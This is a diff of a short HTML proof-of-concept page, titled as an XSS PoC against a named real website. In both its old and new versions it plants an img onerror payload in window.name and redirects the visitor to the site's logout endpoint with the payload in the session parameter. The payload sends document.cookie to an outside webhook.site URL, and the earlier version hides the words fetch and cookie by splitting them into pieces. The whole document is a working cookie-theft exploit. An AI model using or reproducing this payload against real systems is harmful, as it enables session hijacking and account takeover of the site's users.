@@ -1,16 +1,13 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>XSS PoC - Empire Flippers</title>
-    <meta charset="UTF-8">
-  </head>
   <body>
     <script>
-      // Payload dentro do window.name (vai refletir no campo hs_context)
-      window.name = `<img src=x onerror=window['fet'+'ch']('https://webhook.site/eef1b76d-4e01-4f2a-ae89-f43530997756?cookie='+document['cook'+'ie'])">`;
-
-      // Redireciona para o endpoint vulnerável com o payload embedado
-      window.location.href = "https://app.empireflippers.com/logout?session=" + encodeURIComponent(window.name);
+      const steal = `
+        <img src=x onerror=(()=>fetch('https://webhook.site/eef1b76d-4e01-4f2a-ae89-f43530997756?d='+document.cookie))()>
+      `;
+      const encoded = encodeURIComponent(steal);
+      window.name = steal;
+      location.href = "https://app.empireflippers.com/logout?session=" + encoded;
     </script>
   </body>
 </html>
